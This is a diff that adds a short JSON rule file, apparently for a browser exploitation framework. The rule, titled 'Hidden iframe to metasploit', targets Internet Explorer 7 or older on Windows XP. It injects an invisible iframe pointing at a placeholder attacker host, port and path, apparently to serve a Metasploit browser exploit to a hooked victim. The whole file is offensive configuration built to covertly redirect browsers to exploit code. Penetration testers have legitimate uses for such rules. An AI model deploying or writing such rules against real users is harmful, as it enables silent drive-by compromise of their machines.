@@ -1,0 +1,19 @@
+{
+	"name": "Hidden iframe to metasploit",
+	"author": "bt",
+	"browser": "IE",
+	"browser_version": "<= 7",
+	"os": "Windows",
+	"os_version": "== XP",
+	"modules": [
+            {
+		"name": "invisible_iframe",
+                "condition": null,
+                "options": {
+                    "target": "http://<CHANGE_HOST>:<CHANGE_PORT>/<CHANGE_URIPATH>"
+		}
+           }],
+        "execution_order": [0],
+        "execution_delay": [0],
+        "chain_mode": "sequential"
+}
